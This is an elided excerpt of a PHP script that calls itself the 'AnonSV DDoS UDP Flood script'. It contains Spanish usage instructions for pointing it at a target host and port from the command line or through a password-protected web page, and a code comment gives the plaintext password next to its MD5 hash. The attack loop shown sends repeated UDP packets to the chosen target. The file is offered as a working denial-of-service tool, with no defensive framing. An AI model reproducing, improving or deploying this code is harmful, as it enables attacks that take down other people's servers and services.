...
// Current version
define('DDOS_VERSION',				'1.0' );

// MD5 Password "an0nsv"
define('DDOS_PASSWORD',				'9513d58bb629e0b478f2db2ad1634a99' );
...
class DDoS {
	...
	public function signature() {
		if(DDOS_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
			$this->println('AnonSV DDoS UDP Flood script');
	...
	public function usage() {
		$this->println("EJEMPLO:");
		$this->println("Desde Terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
		$this->println("Desde webserver: http://localhost/ddos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
		$this->println();
		$this->println("PARAMETROS:");
		$this->println("help	Print this help summary page");
		$this->println("host	REQUIRED especificar IP o HOSTNAME");
		...
		$this->println();
		$this->println("Mas inf: support@anonsv.org");
		$this->println();
	}
	...
	private function attack(){
		...
		$this->log('DDos UDP flood Inicio');
		...
		// Packet number based attack
			...
			while($packets < $max_packet){
				$packets++;
				$this->log('Enviando Paquetes #'.$packets,DDOS_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
			}
	...
	private function set_params($params = array()) {
		...
		foreach($params as $key => $value) {
			if(!in_array($key, $original_params)) {
				$this->set_output("Parametro Desconocido $key", DDOS_OUTPUT_STATUS_ERROR);
				$this->print_output();
				exit(1);
			}
	...
	private function validate_params() {
		...
		if(!$this->is_cli() && md5($this->get_param('pass')) !== DDOS_PASSWORD) {
			$this->set_output("Pass Error", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		elseif(!$this->is_cli()) {
			$this->log('Pass Aceptada');
		}
		
		if(!$this->is_valid_target($this->get_param('host'))) {
			$this->set_output("Host invalido", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
		...
		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
			$this->log("Puerto Invalido", DDOS_LOG_WARNING);
